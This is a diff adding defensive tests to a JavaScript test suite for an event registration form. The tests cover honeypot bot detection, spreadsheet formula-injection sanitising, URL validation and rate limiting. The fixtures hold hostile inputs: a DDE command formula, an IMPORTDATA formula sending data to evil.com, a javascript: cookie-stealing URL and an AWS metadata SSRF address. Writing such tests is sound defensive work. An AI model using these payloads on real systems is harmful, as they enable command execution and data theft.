@@ -197,6 +197,37 @@ assert(!validateSafeUrl('https://in9plus.vip/IN9_APK_dtortqb7ijuo.apk').valid, '
 assert(!validateSafeUrl('https://suspicious-domain.com/malware.exe').valid, 'validateSafeUrl blocks EXE binary URLs');
 assert(validateSafeUrl('https://github.com/sticsarecmzp').valid, 'validateSafeUrl allows legitimate web profiles');
 
+console.log('\n=== 7. Event Registration Security & Anti-Bot Trapping ===');
+// Bot Honeypot behavior simulation
+function isBotPayload(payload) {
+  return Boolean(payload.hp_field && payload.hp_field.trim() !== '');
+}
+assert(isBotPayload({ fullName: 'Bot', hp_field: 'http://spam-link.ru' }), 'Identifies automated bot honeypot submission');
+assert(!isBotPayload({ fullName: 'Ayush Mishra', hp_field: '' }), 'Accepts legitimate student submission with empty honeypot');
+
+// Registration fields CSV / Formula injection neutralization
+const maliciousStudentData = {
+  fullName: '=cmd|\' /C calc\'!A0',
+  college: '@IMPORTDATA("https://evil.com/leak")',
+  github: '+https://github.com/student',
+  phone: '9876543210'
+};
+assert(sanitizeForSpreadsheet(maliciousStudentData.fullName).startsWith("'="), 'Neutralizes formula injection in student fullName');
+assert(sanitizeForSpreadsheet(maliciousStudentData.college).startsWith("'@"), 'Neutralizes formula injection in college name');
+assert(sanitizeForSpreadsheet(maliciousStudentData.github).startsWith("'+"), 'Neutralizes formula injection in github URL string');
+
+// GitHub profile URL security validation
+assert(!validateSafeUrl('javascript:alert(document.cookie)').valid, 'Rejects XSS javascript: URL in GitHub profile field');
+assert(!validateSafeUrl('http://169.254.169.254/metadata').valid, 'Rejects AWS metadata SSRF in GitHub profile field');
+assert(!validateSafeUrl('https://github.com/user/setup.exe').valid, 'Rejects executable binary in GitHub profile field');
+assert(validateSafeUrl('https://github.com/sticsarecmzp').valid, 'Accepts valid secure GitHub profile URL');
+
+// Rate limiting cooldown mechanism
+const mockStorage = {};
+const testLimiterKey = 'test_rate_key';
+mockStorage[testLimiterKey] = Date.now().toString();
+const isRateLimited = (Date.now() - parseInt(mockStorage[testLimiterKey], 10)) < 15000;
+assert(isRateLimited, 'Enforces rate limit cooldown window within 15 seconds');
 
 console.log(`\n========================================`);
 console.log(`Test Execution Summary: ${passed} passed, ${failed} failed.`);
